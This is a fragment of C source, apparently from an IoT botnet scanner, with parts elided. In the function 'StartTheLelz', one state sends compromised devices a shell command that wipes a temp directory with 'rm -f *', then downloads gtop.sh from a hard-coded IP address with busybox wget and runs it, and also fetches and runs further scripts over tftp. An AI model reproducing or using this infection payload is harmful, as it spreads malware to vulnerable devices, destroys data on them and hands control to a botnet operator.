...
void StartTheLelz(char *ip)
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var; rm -f *; busybox wget http://89.34.99.170/gtop.sh; sh gtop.sh; wget1 http://89.34.99.170/gtop.sh; sh gtop.sh; busybox tftp -r tftp.sh -g ; sh tftp.sh; busybox tftp -c get tftp2.sh; sh tftp2.sh\r\n", 284, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; memset(fds[i].sockbuf, 0, 1024); continue; }
					fds[i].state = 10;
